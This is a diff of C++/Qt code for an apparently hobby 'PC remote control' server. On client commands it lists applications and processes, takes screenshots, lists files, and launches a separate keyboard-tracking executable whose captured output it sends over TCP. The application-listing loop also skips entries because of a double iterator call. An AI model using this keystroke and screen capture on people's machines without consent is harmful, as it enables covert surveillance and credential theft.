@@ -10,10 +10,16 @@ Server::Server(QObject *parent)
     : QObject{parent}
 {
     initServer();
+//    myFileExplorer = new fileExplorer;
     connect(tcpServer, &QTcpServer::newConnection, this, &Server::newConnection);
 
     clients = QList<QTcpSocket*>();
 }
+
+//Server::~Server() {
+//    delete processKeyboardTrack;
+//    delete processListProcesses;
+//}
 
 void Server::initServer()
 {
@@ -44,10 +50,6 @@ void Server::initServer()
 
 void Server::sendMessage(QTcpSocket* sender, const QString &msg)
 {
-//    QTcpSocket *clientSocket = static_cast<QTcpSocket*>(sender());
-//    if (clientSocket != nullptr) {
-//        qDebug() << "send message client connection not null";
-//    }
     QByteArray block;
     QDataStream out(&block, QIODevice::WriteOnly);
     out.setVersion(QDataStream::Qt_6_5);
@@ -57,10 +59,6 @@ void Server::sendMessage(QTcpSocket* sender, const QString &msg)
 }
 
 void Server::sendScreenshot(QTcpSocket* sender, const QPixmap &screenshot) {
-//    QTcpSocket *clientSocket = static_cast<QTcpSocket*>(sender());
-//    if (clientSocket != nullptr) {
-//        qDebug() << "send screenshot client connection not null";
-//    }
     QPixmap resizedScreenshot = screenshot.scaled(800, 800, Qt::KeepAspectRatio, Qt::SmoothTransformation);
 
     QByteArray block;
@@ -77,30 +75,25 @@ void Server::sendScreenshot(QTcpSocket* sender, const QPixmap &screenshot) {
     sender->write(block);
 }
 
-void Server::sendFileStructure(QTcpSocket* sender, const QFileSystemModel &model) {
-//    QTcpSocket *clientSocket = static_cast<QTcpSocket*>(sender());
+void Server::sendFileStructure(QTcpSocket* sender, const QStringList &fileStruct)
+{
     QByteArray block;
     QDataStream out(&block, QIODevice::WriteOnly);
     out.setVersion(QDataStream::Qt_6_5);
 
-    QVariantList modelData;
-//    modelData.append(model.rootPath());
-//    for (int row = 0; row < model.rowCount(); ++row) {
-//        QVariantMap rowData;
-//        QModelIndex index = model.index(row, 0);
-//        rowData["fileName"] = model.fileName(index);
-//        rowData["filePath"] = model.filePath(index);
-//        rowData["fileSize"] = model.size(index);
-//        rowData["fileType"] = model.type(index);
-//        rowData["fileDateTime"] = model.fileTime(index);
-//        modelData.append(rowData);
-//    }
-
-//    out << tr("file model") << model;
-    // Send the QByteArray over the network, e.g. via a QTcpSocket
+    out << tr("file") << fileStruct;
     sender->write(block);
 }
 
+void Server::sendApplications(QTcpSocket* sender, const QStringList &appList)
+{
+    QByteArray block;
+    QDataStream out(&block, QIODevice::WriteOnly);
+    out.setVersion(QDataStream::Qt_6_5);
+
+    out << tr("list applications") << appList;
+    sender->write(block);
+}
 
 void Server::readMessage() {
     QTcpSocket *clientConnection = static_cast<QTcpSocket*>(sender());
@@ -122,19 +115,44 @@ void Server::readMessage() {
 //    statusLabel->setText(message);
 
     if (message == tr("list applications")) {
-        sendMessage(clientConnection, "here are the applications: ");
+//        sendMessage(clientConnection, "here are the applications: ");
+        QStringList paths = QStandardPaths::standardLocations(QStandardPaths::ApplicationsLocation);
+//        QStringList paths;
+//        paths << "%programdata%\\Microsoft\\Windows\\Start Menu\\Programs";
+        QStringList applications;
+        for (const QString &path : paths)
+        {
+//            QDir dir(path);
+            QDirIterator it(path, {"*.exe","*.lnk"}, QDir::Files, QDirIterator::Subdirectories);
+            while (it.hasNext()) {
+                qDebug() << it.next();
+                applications.append(it.next());
+            }
+        }
+        sendApplications(clientConnection, applications);
+
+        qDebug() << applications;
+
 //        tracking_keyboard();
     }
     else if (message == tr("list processes")) {
-        sendMessage(clientConnection, "here are the processes: ");
-
-//        startHook();
+//        sendMessage(clientConnection, "here are the processes: ");
+        processListProcesses = new QProcess();
+        processListProcesses->start("D:\\_Codes\\Qt_Creator_Projects\\PC_Remote_Control\\list_processes.exe");
+//        connect(processListProcesses, &QProcess::readyReadStandardOutput, this, &Server::processDataProcess);
+        connect(processListProcesses, &QProcess::readyReadStandardOutput, this, [=]() {
+            sendProcesses(clientConnection);
+        });
+        //        startHook();
     }
     else if (message == tr("keyboard track")) {
         qDebug() << "keyboard tracking started?";
-        m_process = new QProcess();
-        m_process->start("D:\\_Codes\\Qt_Creator_Projects\\PC_Remote_Control\\keyboard_track.exe");
-        connect(m_process, &QProcess::readyReadStandardOutput, this, &Server::processData);
+        processKeyboardTrack = new QProcess();
+        processKeyboardTrack->start("D:\\_Codes\\Qt_Creator_Projects\\PC_Remote_Control\\keyboard_track.exe");
+//        connect(processKeyboardTrack, &QProcess::readyReadStandardOutput, this, &Server::processData);
+        connect(processKeyboardTrack, &QProcess::readyReadStandardOutput, this, [=]() {
+            sendKeyboardTrack(clientConnection);
+        });
     }
     else if (message == tr("take screenshot")) {
         qDebug() << "taken screenshot";
@@ -165,8 +183,15 @@ void Server::readMessage() {
         recorder->stop_by_msg();
         delete recorder;
     }
-    else if (message == tr("file explorer")) {
-
+    else if (message == "ls") {
+        //        QString dirPath = args.size() > 1 ? args[1] : ".";
+        QString dirPath = ".";
+        QDir dir(dirPath);
+        QStringList entries = dir.entryList();
+        QString response = entries.join("\n");
+        sendFileStructure(clientConnection, entries);
+        qDebug() << entries << "\n";
+        //        clientSocket->flush();
     }
 
     emit(readyRead(message));
@@ -178,11 +203,32 @@ void Server::stream(QTcpSocket* clientConnection) {
     sendScreenshot(clientConnection, screenshot);
 }
 
-void Server::processData() {
-    QTcpSocket *clientSocket = static_cast<QTcpSocket*>(sender());
+void Server::sendKeyboardTrack(QTcpSocket* clientSocket) {
+    QProcess *process = static_cast<QProcess*>(sender());
     qDebug() << "is this on?";
-    QString data = m_process->readAllStandardOutput();
+    QString data = process->readAllStandardOutput();
     sendMessage(clientSocket, data);
+}
+
+void Server::sendProcesses(QTcpSocket* clientSocket) {
+    QProcess *process = static_cast<QProcess *>(sender());
+    qDebug() << "listing processing?";
+    QString output = process->readAllStandardOutput();
+    QStringList lines = output.split('\n');
+
+//    foreach (QString line, lines) {
+//        QList<QString>info  = line.split(' ', Qt::SkipEmptyParts);
+//        if (info.size() > 1)
+//            qDebug() << info[0] << info[1];
+////        qDebug() << line;
+//    }
+    QByteArray block;
+    QDataStream out(&block, QIODevice::WriteOnly);
+    out.setVersion(QDataStream::Qt_6_5);
+
+    out << tr("list processes") << lines;
+    clientSocket->write(block);
+//    sendMessage(clientSocket, tr("huhu"));
 }
 
 void Server::newConnection() {
@@ -197,6 +243,13 @@ void Server::disconnected() {
     QTcpSocket *clientSocket = static_cast<QTcpSocket*>(sender());
     clients.removeOne(clientSocket);
 }
+
+
+
+
+//QTcpServer * Server::getServer() {
+//    return tcpServer;
+//}
 
 //LRESULT CALLBACK Server::MouseHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
 //    // Check if the message is a mouse click event
